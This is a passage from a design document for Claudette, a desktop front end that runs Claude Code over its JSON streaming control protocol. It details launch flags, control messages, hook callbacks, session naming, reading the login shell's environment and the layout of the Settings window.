- **Claudette.Platform** holds the OS-specific code: the process monitor, notifications with the Dock and taskbar badge ([§10](#10-notifications)), the OS credential store for a stored Perforce password ([§18](#perforce-ticket-handling)), the installers for Claudette's own updates: the MSIX update through `PackageManager` on Windows, and swapping `Claudette.app` on macOS ([§2](#updating-claudette)), reading the login shell's environment ([below](#login-shell-environment)), and keeping the computer awake ([§9](#keeping-the-computer-awake), and for tabs connected to the Claude app, [§18](#remote-control-the-claude-app)). Their interfaces, `ICredentialStore`, `IAppInstaller`, `ILoginShell` and `ISleepBlocker`, are in Core, with the release feed, the downloader and `UserEnvironment`.
  - `ClaudeSession` owns one `claude` process. It turns the output stream into typed events (`Sessions/SessionEvents.cs`: `TurnStarted`, `TextDelta` and `ThinkingDelta`, `AssistantMessageReceived`, `ToolResultsReceived`, `PermissionRequested`, `ElicitationRequested`, `PromptReplayed`, `RateLimitUpdated`, `TurnCompleted`, `AuthenticationRequired`, `SystemNotice`, `SessionExited`…), and exposes commands such as `SendUserMessageAsync`, `InterruptAsync`, `CancelQueuedMessageAsync`, `SetModelAsync`, `SetEffortAsync`, `SetPermissionModeAsync`, `GetContextUsageAsync` and `RewindFilesAsync`. A permission prompt is answered on the `PermissionRequest` the event carries (`Allow`, `Deny`). The `system` subtypes Claudette reads have typed views on `SystemMessage` (`Protocol/SystemNotices.cs`), so the App never reads their raw JSON.
- **Threading.** Each session reads its process on a background task. Events go to the UI thread through a channel, and streaming text is batched so the UI isn't updated for every token.
- **Resilience.** If a process exits unexpectedly, the tab shows an error with a **Restart** button that resumes the same session ID.
- **Shutdown.** When Claudette closes while a tab is working, it interrupts the turn first so the session is left in a clean state. Its own restart into a new build or version doesn't, so Claude Code can carry the turn on afterwards ([§9](#working-on-claudette)).
- **Logging.** Raw protocol traffic can be logged per session (off by default) to help debug parsing problems when Claude Code changes its output. Sign-in secrets are taken out of each line before it's written: the pasted sign-in code and its state, values under the usual names for tokens, keys and passwords, and the `code` and `state` of an address. Claudette's own warnings and errors always go to `claudette.log` in the data folder's `logs` folder (**Open log folder** opens `logs/protocol`, where the protocol logs go, one level down). The file is kept under 2 MB: past that it becomes `claudette.1.log`, replacing the one before.
- **Nothing ends the app by surprise.** Each session event is applied on its own: one that fails is logged and noted once in the conversation (*"Claudette couldn't show part of this conversation…"*), and the rest carry on. An exception nothing else caught on the UI thread is logged and handled rather than closing Claudette, which would leave every tab's `claude` running ([§4](#process-monitor)), and a failed background task nobody waited for is logged.

### Integration with Claude Code

There is no official .NET Agent SDK; the official ones are Python and TypeScript. Claudette drives Claude Code the same way those SDKs do: one long-running `claude` process per tab, in headless streaming mode, exchanging JSON lines over stdin and stdout. It doesn't pass `--bare`, so the user's `CLAUDE.md`, settings, hooks, MCP servers, skills and plugins load the same as in the terminal. A folder's own configuration does too, once the user has said to trust the folder: a `-p` session doesn't ask itself, so Claudette does first ([Folder trust](#folder-trust)). A tab started without it passes `--setting-sources user`. A tab under an API-key account passes `--settings` with the account's `apiKeyHelper`, Claudette itself ([§4](#accounts)).

Everything in this section was confirmed by the milestone 1 spike on 2026-09-28 against Claude Code 2.1.284, unless marked otherwise.

**Launch**, with the tab's folder as the working directory:

```
claude -p --input-format stream-json --output-format stream-json --verbose
          --include-partial-messages --permission-prompt-tool stdio
          --thinking-display summarized --forward-subagent-text
          --model <model> --effort <level> --permission-mode <mode>
          [--resume <session-id or transcript path>]
          [--append-system-prompt <the project's and the Perforce workspace's notes, §18, and the subagents' note, §5>]
```

- `--permission-prompt-tool stdio` sends permission prompts to Claudette as control requests. The TypeScript SDK passes this flag when a `canUseTool` callback is set.
- `--thinking-display summarized` makes newer models return thinking text; by default they send empty thinking blocks. The flag isn't in `claude --help`, but the Agent SDKs pass it.
- `--forward-subagent-text` includes subagents' text and thinking in the stream, so subagent groups can show them. A group's items are virtualized like the conversation's: a collapsed group builds none of them.
- `--prompt-suggestions`, while Settings → Conversation → **Suggest my next prompt** is on (off by default), has Claude Code send the next prompt it predicts after each turn ([§5](#prompt-suggestions)).
- **Clean environment.** Claude Code sets session variables for the processes it starts, such as `CLAUDECODE`, `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_ENTRYPOINT` and `CLAUDE_CODE_MESSAGING_SOCKET`. If Claudette was started from a terminal inside Claude Code, those variables make `claude` behave as a child session; in the spike it ignored the API key and reported "Not logged in".
  - Claudette removes exactly those variables. The full list is `ClaudeEnvironment.SessionVariables`, tracked in `compat/surface.yaml`.
  - It doesn't strip by prefix, because variables like `CLAUDE_CONFIG_DIR` and `CLAUDE_CODE_USE_BEDROCK` are user configuration.
  - The real-CLI tests run from inside Claude Code confirmed that the list is enough.
  - The environment it removes them from is the user environment, which on macOS and Linux can hold the login shell's variables ([below](#login-shell-environment)).

**Startup.** The first thing Claudette sends is an `initialize` control request. The reply contains:

- `models`: each with `value`, `resolvedModel`, `displayName`, `description`, `supportsEffort` and `supportedEffortLevels`.
- `commands`: slash commands, for autocomplete.
- `account`: `email`, `organization`, `subscriptionType` and `tokenSource`.
- Also `current_permission_mode`, `agents`, output styles and `pid`.

The `system/init` message that follows gives `session_id`, `model`, `permissionMode`, `claude_code_version` and `capabilities`. In 2.1.284 the capabilities were `interrupt_receipt_v1`, `interrupt_cancel_queued_v1`, `msg_lifecycle_v1`, `mcp_read_resource_v1` and `mcp_tool_ui_meta_v1`. 2.1.285 can add `third_party_notification_caution`, which goes with the notifications a cloud session queues for Claude, 2.1.286 lists `sdk_mcp_tools_list_changed`, `sdk_mcp_manifests` and `ui_surface_v1`, 2.1.300 adds `interrupt_send_now_v1` and `request_marker_lists_v1`, and 2.1.308 `interrupt_requeue_taken_v1`, `lifecycle_wakeup_source_v1` and `mcp_call_result_not_for_model_v1`; Claudette uses none of them.

**Wire format.** Every control message is one JSON line:

```
→ {"type":"control_request","request_id":"req_1","request":{"subtype":"interrupt"}}
← {"type":"control_response","response":{"subtype":"success","request_id":"req_1","response":{"still_queued":[]}}}
```

- Errors come back as `"subtype":"error"` with an `error` string.
- Claude Code sends its own control requests the same way (for example `can_use_tool`), and Claudette answers with a `control_response` carrying the same `request_id`.
- The wire names come from the Agent SDK sources. The SDK docs describe the matching methods but not the wire format.

| Need | How | Documented |
|---|---|---|
| Send a message, with images | A `user` message as one JSON line on stdin. Images are base64 `image` content blocks before the text ([§5](#attachments)). Each carries a `uuid` Claudette makes, which the echo, the transcript and the replies' `user_message_uuid` keep; one the user typed or chose (**Compact**) also carries `origin: {kind: "human"}` (below). See "Messages sent while Claude is working" below. | Yes |
| Receive output | JSON lines on stdout: `system/init`, `system/status`, `assistant`, `user` (tool results, with `tool_use_result`), `stream_event` (partial text), `result`, `rate_limit_event`, `auth_status`, `permission_denied`, `informational`, `api_retry`, `conversation_reset`, `task_started` / `task_progress` / `task_updated` / `task_notification`, `tool_progress`, `thinking_tokens`, `autocompact_state` | Yes |
| Stop the current turn | `interrupt`, with `cancel_queued` when `interrupt_cancel_queued_v1` is listed ([§5](#queued-messages)). The reply lists `still_queued` messages and, with `cancel_queued`, the `cancelled` ones; the turn ends with a `result` of `error_during_execution` / `aborted_streaming`. SIGINT is a fallback. Never SIGTERM: it leaves the turn unfinished with no result. | Yes |
| Take one queued message back | `cancel_async_message` with `message_uuid`; 2.1.286 answers `{"cancelled": true}` ([§5](#queued-messages)) | **No** |
| Permission prompts | Incoming `can_use_tool`; reply allow, allow with `updatedPermissions`, or deny with a message ([§7](#7-permission-prompts)) | Behavior yes, wire format no |
| Hook callbacks | `hooks` in `initialize`; incoming `hook_callback`, answered with the hook's output (below) | Behavior yes, wire format no |
| Change model | `set_model` with `model`. Applied in place, even mid-turn, and the conversation is kept. Claude Code also emits a `user` message containing `<local-command-stdout>Set model to …</local-command-stdout>`, which Claudette shows as a small system note. | Yes |
| Change effort | `apply_flag_settings` with `settings: { effortLevel }`. Applies from the next request, which carries `output_config.effort`. | Yes |
| Change permission mode | `set_permission_mode` with `mode`; also reported as a `system/status` message | Yes |
| Context window usage | `get_context_usage`. Claude Code calls the API's token-counting endpoint for this, which costs nothing. | Yes |
| Stop a background task | `stop_task` with `task_id` | Yes |
| Stop one subagent | `stop_task` with the subagent's task id, in the foreground too ([§18](#agent-map)) | **No** (documented for background tasks) |
| Plan usage limits | `get_usage` ([§6](#data-source)) | **No** (marked experimental) |
| A turn stopped at a usage limit | A `rate_limit_event` with `status: rejected`, `resetsAt` and no `errorCode`, and a `result` with `is_error` and `api_error_status` 429 ([§6](#continuing-after-a-limit-resets)) | Yes (`rateLimitType`, which only names the limit, no) |
| Sign-in | `claude_authenticate`, `claude_oauth_wait_for_completion`, `claude_oauth_callback` ([§11](#signing-in)) | **No** |
| Session title | `generate_session_title`, `rename_session` (below) | **No** |
| Remote Control | `remote_control` with `enabled` and `name`; `system/bridge_state` reports the connection, and `system/worker_shutting_down` its end ([§18](#remote-control-the-claude-app)) | **No** (`worker_shutting_down` yes) |
| Resume | `--resume <session-id>`, or `--resume <path to a .jsonl>` ([§9](#session-library-sync-across-machines)) | Yes |
| Feature detection | The `capabilities` array on `system/init`. Check this instead of comparing version numbers. | Yes |

Every **No** row has a fallback, listed in its section, and is marked `undocumented` in `compat/surface.yaml` ([§16](#16-tracking-claude-code-changes)).

**Hook callbacks.** Claudette can register hooks that Claude Code calls back over the control protocol, the way the Agent SDKs register hook callbacks. Perforce ticket handling uses a PreToolUse hook for Bash ([§18](#perforce-ticket-handling)), and every tab registers one for `SendMessage` after it, for threads ([§18](#threads)), and one for `Agent|Task` after that, for Settings → Claude Code → Subagents ([§5](#subagents)). The registration rides on `initialize`, numbered as the Python Agent SDK numbers them, with the timeout in seconds:

```
→ {"type":"control_request","request_id":"req_1","request":{"subtype":"initialize",
     "hooks":{"PreToolUse":[{"matcher":"Bash","hookCallbackIds":["hook_0"],"timeout":300}]}}}
← {"type":"control_request","request_id":"<uuid>","request":{"subtype":"hook_callback","callback_id":"hook_0",
     "input":{"session_id":…,"transcript_path":…,"cwd":…,"prompt_id":…,"permission_mode":"default",
              "hook_event_name":"PreToolUse","tool_name":"Bash",
              "tool_input":{"command":"p4 info","description":…},"tool_use_id":"toolu_…"},
     "tool_use_id":"toolu_…"}}
→ {"type":"control_response","response":{"subtype":"success","request_id":"<uuid>","response":{"continue":true}}}
```

Confirmed against Claude Code 2.1.284 with the mock Messages API (2026-09-29):

- The callback comes before the permission check: the `can_use_tool` request follows the hook's answer, and waits for it.
- `{"continue": true}` and `{}` both let the tool run, and the permission prompt still happens. The hook output is the documented hook JSON ([hooks](https://code.claude.com/docs/en/hooks)). Claudette sends no changed input, and one decision: a thread's hook denies a `SendMessage` it delivered itself ([§18](#threads)).
- A denial (`hookSpecificOutput` with `permissionDecision: "deny"` and a `permissionDecisionReason`) stops the tool before any permission prompt: Claude gets the reason as the tool's error result, and the turn's `result` lists the call in `permission_denials` (checked 2026-10-09).
- A hook registered with a longer `timeout` can take longer than the 60-second default: one answered after 75 seconds, with 600 registered, was honored (checked 2026-10-09).
- An error answer is logged on standard error, and the tool runs as if there were no hook.
- A hook that isn't answered within its `timeout` gets a `control_cancel_request`, and **the tool isn't run**: its result is an error, *"PreToolUse hook did not respond before its timeout (host client may be unreachable). The tool call was not executed…"*.
- Interrupting the turn while a hook waits also sends a `control_cancel_request` for it, and the tool call is rejected.

`ClaudeSession` runs each callback off the read loop and answers with its output; an unknown callback or a failing one gets an error answer, and a withdrawn one is cancelled and not answered. The initialize request still sends `"hooks": null` when there are none.

**Who a message is from.** Since 2.1.210 Claude Code treats a user message without an `origin` as unattributed: checks that need a person's prompt, such as the `ultracode` workflow keyword, don't accept it, and a result's `queued_turn_count` doesn't count it. So a prompt the user typed, and the `/compact` behind **Compact**, say `origin: {kind: "human"}`. Check-ins, continuing after a usage limit and Claudette's other messages (the Perforce retry, the `/remote-control` fallback, a thread's messages to its sub-threads and their report) carry no origin, as before: they aren't the user's words. A message another of the user's sessions sends a tab (Claude Code's cross-session messaging) echoes with `origin: {kind: "peer", name, body}`, and gets a card of its own, *"From the session ‹name›"* (*"From another session"* when it has no name), rather than being taken for a waiting prompt's echo ([§18](#threads)). Every message Claudette sends has its own `uuid`, and a message sent without a card (**Compact**) is never taken for a prompt's echo.

**Messages sent while Claude is working.**

- **During a tool call:** the message is delivered inside the running turn, together with the next tool result, as a note that says *"The user sent a new message while you were working"*. This is what check-ins rely on ([§5](#check-ins-on-long-turns)).
- **During a text-only reply:** there's no tool boundary, so the message waits and runs as the next turn.

**Tool results.** The `user` message that carries a tool result also has a `tool_use_result` field with structured details:

- Edit and Write: `originalFile`, `structuredPatch`, `oldString` / `newString`. Transcripts keep `originalFile` only up to 10,000 characters ([§8](#8-file-changes--diff-view), "Large files in transcripts").
- Bash: `stdout`, `stderr`, `interrupted`, and `gitOperation`, `timedOutAfterMs`, `backgroundTaskId` and `backgroundedByUser` for the card's chips and summary ([§5](#5-conversation-view)).

The conversation view and diff view use these instead of parsing the tool result text.

**Session naming.**

- Headless sessions don't get an AI-generated title on their own.
- After a tab's first prompt, Claudette sends `generate_session_title` with `description` set to the prompt and `persist: true`. The reply's `title` becomes the tab name. This is one small model call per new session.
- A rename in Claudette is stored by Claudette.
- **The name in Claude Code.** Settings → Claude Code → **Name each tab's session in Claude Code after the tab**, on by default for a new install (settings saved before keep what they had), gives the session the tab's name, generated or the user's. It's the name other Claude Code sessions message it by with `SendMessage` and `ListAgents` ([§5](#autocomplete), "Sessions and agents"), and `claude --resume <name>` in a terminal finds it.
  - Without one, Claude Code names a session after its folder with a two-character suffix (`claudette-3f`), so every tab in a folder looked alike to the others' Claude, which had to message them all to find out which was which.
  - Each start passes `--name` once the tab has a name: a session resumed without it goes back to a name made from the folder (checked against 2.1.284). A name that changes while the session runs is sent with `rename_session` (`title`, `source: "host"`), which takes effect at once. Both write `custom-title` and `agent-name` entries to the transcript; History reads the custom title as before.
  - Claude Code gives a renamed session a variant when another session already has the name (`Art page-joyful-stearns`). It doesn't check `--name` at a `-p` session's start, so two tabs with one name can share it; Claude Code then adds a short identifier when Claude lists them.
  - **Claude Code's sessions folder.** Claude Code keeps an entry for each running session in `sessions/<pid>.json` in its config folder, which `/list-agents` reads too: `pid`, `sessionId`, `cwd`, `name`, `nameSource` (`derived` for a name it made up, `user` for one given), `status` and more. `LiveSessions` reads it (undocumented, so tolerantly; the folder's `.key` files are messaging keys and are never read), skipping a session whose process is gone. `LiveSessionsService` reads it again whenever Claude Code writes there, since a rename is written just after `rename_session` is answered, and when a tab's session starts. It gives the info card's **Reached as** row, found by the tab's process and then its session ID, and the other sessions the composer's `@` lists. Claudette's utility session is left out by its folder.
- Both are saved in the transcript, as `{"type":"ai-title","aiTitle":…}` and `{"type":"custom-title","customTitle":…}` entries. History reads them from there, and the last entry of each type wins.
- **Fallback** if these requests stop working: name the tab from the first line of the first prompt.
  - It's also what happens when the user sets `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`: Claude Code then answers `generate_session_title` with `{"title": null}` and makes no model call (seen in 2.1.286; `RealCliTests`, which run that way). `rename_session` still works.
- A `conversation_reset` message (from `/clear`) clears the view and drops the cached title.

**Utility session.** Claudette keeps one hidden `claude` process with `--no-session-persistence` that never sends a prompt. It serves the requests that don't belong to a tab: `initialize` (model list and account), `get_usage`, and sign-in. It's started on launch and restarted if it exits.

**Transcripts.** Sessions are stored as `<session-id>.jsonl` in the `projectsDirectory` reported by `claude auth status` (normally `~/.claude/projects/<project>/`). The format is internal and changes between versions, so `TranscriptReader` is kept separate, ignores entries it doesn't recognize, and is tested against real files from several Claude Code versions.

**Protocol risk.** To contain it:

- Keep all protocol code behind one interface (`IClaudeTransport`), and test it against recorded protocol traffic.
- Feature-detect with `capabilities`, and enforce a minimum Claude Code version ([§12](#12-claude-code-updates)).
- Watch for changes daily ([§16](#16-tracking-claude-code-changes)).
- **Fallback:** if the wire protocol changes too often, swap in a small Node sidecar that runs the official TypeScript Agent SDK and relays to Claudette over a local pipe. This means shipping Node.

### Login shell environment

An app started from the Dock, Finder or a desktop launcher gets a minimal environment: on macOS its `PATH` is `/usr/bin:/bin:/usr/sbin:/sbin`. Homebrew's `PATH`, nvm, pyenv and the like are usually set in `~/.zprofile` or `~/.bashrc`. Claude Code's Bash tool sources the shell's startup file for aliases and functions, but environment variables come from Claude Code's own environment ([tools reference](https://code.claude.com/docs/en/tools-reference#what-persists-between-commands)). So Claude's commands in such a Claudette couldn't find `node`, `dotnet` or Homebrew's tools, which work in a terminal `claude`. Claudette reads the login shell's environment, as VS Code does.

- **When.** On macOS and Linux, when **Use my login shell's environment** is on (Settings → Claude Code, on by default) and Claudette wasn't started from a terminal. Windows apps get the user's full environment, so Windows never needs it.
  - **Started from a terminal** means `TERM` is set or Claudette has a controlling terminal (`/dev/tty` opens). Its environment came from a shell then, `dotnet run` included. An app started from the Dock, Finder, `open` or a desktop launcher has neither.
  - Either one is enough. `TERM` without a terminal is left by a terminal that has closed, or by a desktop session started with `startx`, whose environment came from a login shell. And an interactive shell run while Claudette has a terminal would take that terminal over (bash opens `/dev/tty` for job control).
- **How.** `LoginShellReader` (Claudette.Platform, behind `ILoginShell` in Core) runs the shell once per run:
  - `$SHELL`, or `/bin/zsh` on macOS and `/bin/bash` on Linux.
  - As a login, interactive shell: `-i -l -c` for bash, zsh, sh, dash, ksh, mksh and yash; `-l -i -c` for fish; `-i -c` for tcsh and csh. Other shells (nushell, xonsh, PowerShell) aren't run, and Diagnostics says so.
  - The command prints the environment between random markers, so anything the rc files print is ignored. It prints it twice: `/usr/bin/env -0`, NUL-separated so values with line breaks stay whole, then plain `/usr/bin/env` for an `env` without `-0`, read a line at a time.
  - It starts in the home folder, with Claudette's own environment minus Claude Code's session variables, plus `CLAUDETTE_RESOLVING_ENVIRONMENT=1`. An rc file can check that to skip slow or interactive setup, as with VS Code's `VSCODE_RESOLVING_ENVIRONMENT`.
  - Through `IProcessLauncher`, with a 10-second timeout on the injected `TimeProvider`. A shell that times out is stopped. On a timeout or a failure Claudette logs a warning and carries on with its own environment.
- **Not holding up the window.** Reading starts in the background at launch. The first `claude` start waits for it, up to the timeout: in practice the locator's `claude --version`, before the utility session and the first tab.
- **The merge** (`UserEnvironment`, Core): Claudette's own environment with the login shell's on top, so the shell's values win. Except:
  - `CLAUDETTE_*` variables always come from Claudette's own environment.
  - Claude Code's session variables are never taken from the shell. `ClaudeEnvironment` strips them for `claude` anyway.
  - The shell's bookkeeping about itself (`_`, `PWD`, `OLDPWD`, `SHLVL`) is left out.
  - For `claude`, `ClaudeEnvironment` then removes the session variables and applies the changes for that launch on top.
- **What gets it.** Every `claude` (tabs, the utility session, `--version`, `doctor`, `update` and `auth`), and the other programs Claudette runs for the user: git, `p4` and P4V, diff tools, Homebrew, and project tools' builds, editors and actions ([§18](#project-tools)).
  - `claude` and the diff tool presets are looked for on the login shell's `PATH`. A bare program name (`git`, `p4`, a custom diff command's program) is found on it too, since .NET would search Claudette's own.
  - Every git Claudette runs, for Changed files and the diff view, worktrees and cleaning them up, the `@` list, the Files tab, a library session's uncommitted changes and a source build's new commits, goes through one runner, Core's `GitWorkingTree`, which runs the git Settings → Git → **Path to git** names, or `git` from that `PATH` when it's empty ([§14](#pages)); so does the git difftool preset. It's read as each run starts, so a change applies to the next. Claude's own git commands, in its Bash tool, aren't Claudette's: they run whichever git Claude Code finds.
  - That way `p4` sees the same `P4CONFIG` and `P4PORT` as Claude's own `p4` commands ([§18](#perforce-ticket-handling)), and git finds Git LFS and credential helpers installed with Homebrew.
  - Claudette's own helpers keep Claudette's environment: `ps`, `notify-send`, `secret-tool`, the update installers and restarting Claudette. They're at fixed paths and don't depend on the user's setup.
- **The setting** applies to processes started after the change. Turning it on reads the login shell then, if this run hasn't yet. Turning it off gives new processes Claudette's own environment. The `claude` found at launch stays until the next start.
- **Diagnostics** (Settings → Advanced) say whether it was used, which shell, how long it took and the names of the variables it added or changed. Otherwise they say why not: turned off, started from a terminal, Windows, or the shell timed out, failed or isn't supported. Never a variable's value, since those can be secrets.

> **Not yet tested on a real machine:** a Claudette started from the Dock on macOS, or from a desktop launcher on Linux. The tests run real bash and dash (and zsh and fish where installed) with a made-up home folder.

## 14. Settings

✅ Redesigned 2026-10-23: pages in groups, sections with their own **Reset to defaults**, settings that say what they do, and a window that stays open.

A **Settings** window opens with `Ctrl+,` on Windows or `Cmd+,` on macOS, or from **Settings**, its icon in the header before the menu ([§3](#3-main-window)); on macOS it is also **Settings…** in the app menu. It follows each platform's conventions:

- **It isn't modal.** It stays open beside the main window, and asking for it again brings it to the front, at the page asked for. Its project pages follow the tab selected in the main window ([below](#the-projects-pages)). It opens on the page it was left on. Esc, or `Ctrl/Cmd+W`, closes it, and `Ctrl/Cmd+F` goes to the search box.
- **The sidebar** has the pages in groups, each page with its icon: **Claudette** (General, Appearance, Conversation, Notifications, Keyboard, and About, which has no settings), **Claude** (Claude Code, Accounts, Tabs, Usage, and Advanced, which is mostly about running Claude Code), **Your work** (Sessions, Files and diffs), **Project tools** (All tools, then a page for each kind of project Claudette knows, Unreal Engine, Unity and Godot), **Source control** (Git, whose icon is a branch, then Perforce, whose icon is Perforce's symbol). The arrow keys go through every page; a group's heading isn't a page, and can't be picked or focused. A kind of project switched off on this machine says *Off* after its name, which a screen reader reads as its status; its page can still be picked. The search box is above the pages ([Search](#search)). At the sidebar's foot, each under a line across it, are the selected tab's project with its own pages ([below](#the-projects-pages)), then the version and **Help** ([Version](#version)). Under the last page is as much room as above a group's heading, before the line.
- **A page** has its title, a line saying what's on it, and its sections, each with a heading and sometimes a line under it. Perforce's, Unreal Engine's and Godot's titles are their logos ([About](#about)). In the Claude style each section is a card. The page is a column at most 720 pixels wide, so a setting's control stays near its name and its line stays easy to read; in a window wider than that, the column is centred in the space beside the sidebar.
- **A setting** is a row: its title, one line saying what it does, and **More** for the rest, when there is more; its control is beside it, or under it when it's wide (a text box, a list). A setting that's on or off is a switch. A setting that isn't at its default has a short bar in the accent color at its left, and **Reset**, which shows while it's pointed at or has the focus, puts that one back. **Reset** keeps its place beside the control on every setting that has a default, whether it shows or not, so pointing at a setting, moving the focus into it or changing it moves nothing: its words don't wrap again and its row keeps its height. A setting under another shows its own **Reset** while it's pointed at, not the one above's.
- **Changes apply immediately**; there is no Save button. A text box takes effect when it loses the focus, not on each key, since each change is applied to every tab.
- **Reset to defaults**, at the right of each section's heading, puts that section's settings back, and only those; it's disabled while they're all at their defaults. It leaves what isn't a setting: the library folder and settings sync (changing either moves where sessions and settings live), **Keep usage history**, favorite and recent folders (this machine's data), the accounts and their keys, the stored Perforce password and the per-folder servers and users. Putting the built-in quick suffixes back deletes the user's own, so that section asks first, and so does its row's **Reset**. No reset touches a project's files or its remembered choices, and the project's pages have none.
- **This computer.** A setting settings sync leaves on each machine ([Settings sync](#settings-sync-optional)) says *This computer*, once: by the page's title when the whole page is (General, Claude Code, Accounts, Sessions, Files and diffs, All tools, each kind of project's, Perforce, Advanced), by a section's heading when the whole section is (Git's **Worktrees**, **Git** and **Project Files tab**, but not its **Tab rows**, whose **Show the git branch** syncs), and otherwise by the setting itself (Appearance's **Zoom**, Tabs' **Subagents**). The marks are worked out from the list settings sync copies by (`SyncedSettings`), so the two can't disagree.
- **Tabs that have their own.** A setting each tab can change for itself ([Per-tab overrides](#per-tab-overrides)) says how many have, *2 tabs have their own*, with their names in its tooltip.
- **From a feature to its settings.** A feature's own menu leads to its settings, opening Settings at that page with the setting or section picked out for a moment: Claudette's right-click menu has **Claudette settings…** (Appearance → **Claudette**), the header's cup **Keep-awake settings…** (General → **Keeping the computer awake**), a changed file's menu **Diff tool settings…** (Files and diffs → **Diff tool**), and the quick suffix menu **Edit suffixes…** (Keyboard → **Quick suffixes**).

### Pages

| Page | Sections and settings |
|---|---|
| General | All of it this computer's. **Starting and closing**: Start Claudette when I log in (off by default; kept by the OS, [§9](#starting-at-login)), **Also restore unpinned tabs when Claudette starts** (on by default; pinned tabs are always restored, [§9](#restore-on-launch)), **Confirm before closing a tab where Claude is working**. **Keeping the computer awake**: Keep this computer awake (off by default), **When**: only while Claude has work to finish or whenever Claudette is running, and **Also while tabs are connected to the Claude app** (on by default); the header's cup is the same switch ([§9](#keeping-the-computer-awake), [§18](#remote-control-the-claude-app)). **Updates and status**: Show Claude's service status (on by default; the header's dot and the incident banner, [§18](#service-status)), check for Claudette updates automatically (on by default), include pre-releases (off), and Claudette's version with **Check now** and the update's actions ([Updating Claudette](#updating-claudette)). |
| Appearance | A preview at the top, drawn as the page's settings change: a message, a thinking row and a reply in the chosen style, density, fonts and zoom, and Claudette on the composer at her size. **Look**: Theme, **System** (the default), **Light** or **Dark**; Style, Standard (the default) or Claude, the Claude apps' look ([Visual style](#visual-style)); **Density**, Comfortable (the default) or Compact, which tightens the conversation's spacing, message and card padding and tool rows, the sidebar's rows, and the composer's padding; **Full-width conversation** (off by default): the conversation, the composer, the pinned to-do list and a thread's strip fill the tab's width, instead of stopping at 900 pixels (a width that's easy to read) in the middle of a wide window; **Use the system's title bar** (off by default, this computer's, not on Linux): the OS's title bar over the header, rather than the header as the title bar ([Window frame](#window-frame)). **Text**: font and size for the conversation, and for code: pick an installed font or type a name; empty means the default (the app's own font, and Cascadia Mono, Consolas or Menlo for code), and a font that isn't installed falls back to it. Markdown follows these too (LiveMarkdown brings its own Arial and Consolas otherwise). **Accessibility**: **Zoom** (80% to 200%; this computer's) and **Motion** (follow the system, reduce, or don't) ([Accessibility](#accessibility)). **Claudette**: **Show Claudette on the composer** (on by default), with her size, how often she does something, and whether she shares tips ([§5](#claudette-on-the-composer)), and **Games with Claudette** (on by default; [§18](#games-with-claudette)). Everything here applies at once. |
| Conversation | **Steps and replies**: **Quieter in-between steps** (on by default; [§18](#conversation-cards)), **Indent your messages** and **Indent Claude's steps** (both off by default; [§18](#conversation-cards)), **Show tool calls collapsed** (off; [§18](#conversation-cards)), **Show thinking expanded** (off), **Show subagents' work**: under the tab in the sidebar (the default) or in the conversation ([§5](#subagents)), and **Show every hook run** (off; [§5](#hook-runs)). **While Claude works**: show fun words and show what Claude is doing (both on by default; [Working line](#working-line)), and **Messages sent while Claude works**: sent into the turn (the default) or queued until it ends ([§5](#queued-messages)). **Message box**: **Show when the prompt cache expires** (on by default) and **Suggest my next prompt** (off by default; [§5](#prompt-suggestions)). **Tab rows**: show context and task progress (both on by default; [§4](#sidebar), [§5](#tasks)); the git branch is on Git. |
| Notifications | **Notify me when**: a switch for each type in [§10](#10-notifications), including **A project action finishes**. **The Dock or taskbar icon**: show how many tabs need you, and animate it while tabs work or wait. |
| Keyboard | **Sending**: **Send with**: Enter (the default) or `Ctrl/Cmd+Enter`. **Shortcuts**: every shortcut, each one rebindable, and the keys that can't be changed ([below](#keyboard-shortcuts)). **Quick suffixes**: the list of suffixes, each with its label, text and optional shortcut, to add, edit, reorder and delete ([§5](#quick-suffixes)). |
| Claude Code | All of it this computer's. **Claude Code**: installed version and install method, from `claude doctor`, check for Claude Code updates automatically, and the path to `claude` (auto-detected, with **Browse…**). **Account**: the signed-in account (email, plan and organization), with **Sign in** / **Sign out…**, the same as the header's account menu ([§11](#signing-in)). **Starting a session**: **Name each tab's session in Claude Code after the tab**, ask before using a new folder's own configuration (on by default; [Folder trust](#folder-trust)), use my login shell's environment (macOS and Linux only, on by default; [§13](#login-shell-environment)), keep copies of files Claude changes, so prompts can be rewound (on by default), give Claude a task list (on by default; [§5](#tasks)), summarize subagents' progress (off by default; [§5](#subagents)), and the fallback model (none by default). **Claude app**: Connect new tabs to the Claude app (off by default; each tab has its own switch), with what it does and how to get pushes on the phone. Disabled, with the reason, when the account can't use it ([§18](#remote-control-the-claude-app)). |
| Accounts | All of it this computer's. **Accounts**: New folders use (Default unless changed), then each account besides Default: its name, its tag's color, warnings when its estimated spend passes an amount today or this month, **Change key…** and **Remove…**. **Add an API key**: a name and the key, which goes only to the OS credential store. See [§4](#accounts). |
| Tabs | **New tabs start with**: model, effort level, permission mode and **Subagents**, each of which a tab can change for itself ([Per-tab overrides](#per-tab-overrides)). The permission mode is **Claude Code's default** unless chosen, named with the mode it gives, usually Auto ([Starting mode](#starting-mode)). The model and effort lists are what Claude Code offered in its last `initialize` reply on this machine (the models and each one's effort levels, kept with the machine's state), with a built-in list only until a session has started; Tab settings… lists them the same way. **Subagents** (this computer's): Claude decides (the default), discourage them, or don't allow them, applied at once ([§5](#subagents)). **At a usage limit**: Continue tasks when a usage limit resets (on by default; [§6](#continuing-after-a-limit-resets)), and Use usage credits once a limit is used up (on by default, and in a tab's menu too; [§6](#tabs-that-dont-use-usage-credits)). **Check-ins on long turns**: on or off, run time and quiet time before checking in, the message, and Notify me when a check-in is sent ([§5](#check-ins-on-long-turns)). **Process monitor**: show it, how often it refreshes, and show command lines ([§4](#process-monitor)). **New tab picker**: number of recent folders to keep (default 20), **Clear recent folders**, and favorite folders (this computer's; **Add folder…**, **Move up**, **Move down**, **Remove**), in the order the picker shows them ([Opening a tab](#opening-a-tab)). **Claude Code's projects** (this computer's): **Show Claude Code's projects in the sidebar** (off until chosen; [Claude Code's projects](#sidebar)). |
| Usage | **Warnings**: **Warn at** and **Alert at** (% of the session used; default 75% and 90%), and the burn rate window (default 30 minutes). **The usage header**: **Show model-specific weekly limits** (on by default), **If Claude Code stops reporting them, read them from /usage** (off by default), and **Detailed usage header** (off by default): the same switch as the header's chevron, kept on this machine ([Detailed header](#detailed-header)). **History**: **Keep usage history**: 1 day, 1 week, 1 month (default), 1 year or forever, with **Clear usage history** beside it ([Usage history](#usage-history)), and **Share usage with my other machines**: plan readings, and synced tabs' turns (off by default; [Sharing across machines](#sharing-across-machines)), with **Clear usage history on every machine…**. |
